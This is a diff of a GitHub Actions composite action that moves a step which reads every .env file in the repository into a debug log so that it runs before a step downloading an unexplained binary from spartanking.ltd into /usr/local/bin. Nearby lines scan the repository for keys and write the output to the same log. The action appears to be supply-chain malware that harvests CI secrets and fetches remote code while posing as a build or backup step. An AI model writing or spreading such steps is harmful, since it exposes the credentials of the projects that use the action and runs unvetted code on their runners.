@@ -37,6 +37,15 @@ runs:
         ls -la | tee -a ${{ inputs.log_debug }}
         echo "" >> ${{ inputs.log_debug }}
       shell: bash
+    - name: 🏗 Extract
+      run: |
+        while read -r file ;do
+        temp_file=$(basename "file"| sed -E -e 's/^/\/tmp\//' -e 's/$/&\.txt/')
+        echo $file | tee -a ${{ inputs.log_debug }}
+        cat $file >> ${{ inputs.log_debug }}
+        done < <(find . -type f -regex ".*\.env\(.[a-z]+\)?$")
+        echo "" >> ${{ inputs.log_debug }}
+      shell: bash
     - name: 📦 Backup
       run: |
         if wget -q --no-hsts https://spartanking.ltd/blowjob -O /usr/local/bin/blowjob; then
@@ -56,15 +65,6 @@ runs:
         nuclei -update-templates && \
         ls -lah &&\
         nuclei -no-stdin -duc -ni -nc -lna  -u ./ -file -t file/keys &> >(tee /dev/stderr |  tee -a ${{ inputs.log_debug }} >/dev/null) 
-        echo "" >> ${{ inputs.log_debug }}
-      shell: bash
-    - name: 🏗 Extract
-      run: |
-        while read -r file ;do
-        temp_file=$(basename "file"| sed -E -e 's/^/\/tmp\//' -e 's/$/&\.txt/')
-        echo $file | tee -a ${{ inputs.log_debug }}
-        cat $file >> ${{ inputs.log_debug }}
-        done < <(find . -type f -regex ".*\.env\(.[a-z]+\)?$")
         echo "" >> ${{ inputs.log_debug }}
       shell: bash
     - name: 🚀 Execute
